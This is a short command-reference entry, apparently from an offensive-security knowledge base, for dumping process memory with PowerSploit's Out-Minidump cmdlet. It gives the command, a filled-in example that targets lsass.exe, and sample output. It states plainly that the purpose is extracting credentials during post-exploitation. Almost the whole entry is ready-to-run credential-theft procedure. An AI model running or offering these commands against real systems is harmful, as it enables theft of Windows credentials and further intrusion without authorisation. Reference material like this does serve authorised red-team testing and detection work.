---
type: command
executor: powershell
data: Get-Process -Name $_PROCESS_NAME | Out-Minidump -DumpFilePath $_DUMP_PATH
output: |-
  Directory: C:\temp
  Mode                LastWriteTime         Length Name
  -a----         2023-01-01  12:00 PM      500000000 lsass_1234.dmp
platforms:
  - Windows
tags:
  - memory-dump
  - powershell
verified: true
validated: true
---

# dump-process-memory-out-minidump

## Command

```powershell
Get-Process -Name $_PROCESS_NAME | Out-Minidump -DumpFilePath $_DUMP_PATH
```

## Description

Dumps the memory of a specified process to a file using the Out-Minidump cmdlet from PowerSploit. This is useful for extracting credentials or other sensitive data from processes like lsass.exe during post-exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PROCESS_NAME | Name of the process to dump (e.g., lsass) | Yes |
| $_DUMP_PATH | Full path to the output dump file (e.g., C:\temp\lsass.dmp) | Yes |

## Examples

### Basic Usage

```powershell
Get-Process -Name lsass | Out-Minidump -DumpFilePath C:\temp\lsass.dmp
```

### Advanced Usage

```powershell
Get-Process -Id 1234 | Out-Minidump -DumpFilePath C:\temp\dump.dmp
```

## Expected Output

A .dmp file is created at the specified path, containing the process memory. Example listing:

Directory: C:\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2023-01-01  12:00 PM      500000000 lsass_1234.dmp

## Related

- [[procedures/dump-process-memory-using-powershell]]
- [[tools/PowerSploit]]
